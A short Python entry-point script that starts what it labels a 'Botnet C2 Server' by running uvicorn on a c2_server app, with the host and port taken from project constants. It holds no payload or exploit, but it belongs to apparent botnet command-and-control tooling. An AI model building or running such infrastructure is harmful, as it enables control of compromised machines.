import subprocess
import sys
from src.shared.constants import C2_HOST, C2_PORT

if __name__ == "__main__":
    print(f"🚀 Starting Botnet C2 Server on {C2_HOST}:{C2_PORT}...")
    subprocess.run(["uvicorn", "src.c2_server.app:app", "--host", C2_HOST, "--port", str(C2_PORT), "--reload"])
